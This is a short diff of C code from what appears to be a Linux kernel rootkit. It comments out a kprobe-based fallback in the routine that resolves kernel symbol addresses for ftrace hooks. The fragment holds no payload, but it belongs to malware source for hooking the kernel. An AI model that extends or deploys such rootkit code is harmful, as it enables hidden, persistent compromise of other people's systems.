@@ -76,7 +76,7 @@ static int fh_resolve_hook_address(struct ftrace_hook *hook)
     unregister_kprobe(&kp);
 #endif
     hook->address = kallsyms_lookup_name(hook->name);
-
+/*
     if (!hook->address) {
         struct kprobe kp2;
         unsigned long addr;
@@ -90,7 +90,7 @@ static int fh_resolve_hook_address(struct ftrace_hook *hook)
         unregister_kprobe(&kp2);
         hook->address = addr;
     }
-
+*/
     if (!hook->address)
     {
         //printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
